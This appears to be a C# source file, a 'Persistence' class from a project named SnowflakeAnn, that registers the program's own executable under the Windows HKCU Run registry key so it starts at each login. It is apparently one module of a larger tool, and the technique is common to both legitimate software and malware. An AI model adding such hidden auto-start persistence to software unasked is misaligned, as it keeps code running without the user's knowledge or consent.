using System;

namespace SnowflakeAnn
{
    class Persistence
    {
        GeneralInfo generalInfo;
        public void AddToStartup()
        {
            Microsoft.Win32.RegistryKey rkIsnstance = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            rkIsnstance.SetValue("SnowflakeAnn", generalInfo.ePath);
            rkIsnstance.Dispose();
            rkIsnstance.Close();
        }

        public Persistence(GeneralInfo instance)
        {
            generalInfo = instance;
        }
    }
}
